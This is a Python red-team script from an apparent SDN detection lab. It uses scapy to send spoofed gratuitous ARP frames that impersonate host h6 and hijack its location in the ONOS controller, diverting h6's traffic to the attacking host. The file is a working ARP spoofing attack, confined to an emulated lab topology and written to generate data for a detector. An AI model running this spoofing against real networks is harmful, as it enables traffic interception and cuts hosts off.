#!/usr/bin/env python3
"""
Sentinel red-team: identity spoofing / host-location hijack (S7).

Unlike the flood, this attack is low-volume. From h1 it sends gratuitous ARP
frames whose SOURCE MAC is h6's MAC and whose advertised IP is h6's IP. ONOS's
host-location provider learns where a host lives from ARP, so it moves h6 in its
host table from its real port (s3:2) to the attacker's port (s1:1). Traffic for
h6 is then delivered to h1, and the real h6 is cut off.

The signal this leaves is NOT a rate spike. It is a host that suddenly changes
port, and two ports claiming the same MAC. That is why the detector needs the
host_moves_in and uniq features, not just new_flows.

Runs ONLY inside the emulated lab, from h1, impersonating h6.

Run inside h1's namespace (run_scenario.py does this for you):
  sudo mnexec -a <h1-pid> python3 scenarios/attacks/spoof.py --duration 60

Standalone test from h1's xterm:
  python3 scenarios/attacks/spoof.py --duration 10 --rate 2
"""

import argparse
import os
import sys
import time

from scapy.all import Ether, ARP, sendp

# Lab targets, fixed by topo/lab_topo.py. Hardcoded to the lab victim.
IFACE = "h1-eth0"           # only exists inside h1's namespace
VICTIM_IP = "10.0.3.2"      # h6, the identity being stolen
VICTIM_MAC = "00:00:00:00:00:06"


def gratuitous_arp():
    """A gratuitous ARP 'reply' announcing that h6's IP is at h6's MAC,
    but sent from h1's port. op=2 is an unsolicited reply, which hosts and
    controllers accept as a location update."""
    return (Ether(src=VICTIM_MAC, dst="ff:ff:ff:ff:ff:ff") /
            ARP(op=2, psrc=VICTIM_IP, hwsrc=VICTIM_MAC,
                pdst=VICTIM_IP, hwdst="ff:ff:ff:ff:ff:ff"))


def main():
    p = argparse.ArgumentParser(description="Lab identity spoofing (S7)")
    p.add_argument("--duration", type=int, default=60,
                   help="total seconds the attack runs (default 60)")
    p.add_argument("--rate", type=float, default=2.0,
                   help="spoofed ARPs per second (default 2, low on purpose)")
    args = p.parse_args()

    if not os.path.exists("/sys/class/net/%s" % IFACE):
        sys.exit("%s not found. Run this inside h1 (mnexec -a <h1-pid> ...)."
                 % IFACE)

    frame = gratuitous_arp()
    gap = 1.0 / args.rate
    end = time.time() + args.duration
    sent = 0
    print("spoof: claiming h6 (%s / %s) on h1's port, %.1f ARP/s for %ds" %
          (VICTIM_IP, VICTIM_MAC, args.rate, args.duration), flush=True)

    try:
        while time.time() < end:
            sendp(frame, iface=IFACE, verbose=False)
            sent += 1
            time.sleep(gap)
    except KeyboardInterrupt:
        pass
    print("spoof: stopped after %d spoofed ARPs" % sent, flush=True)


if __name__ == "__main__":
    main()
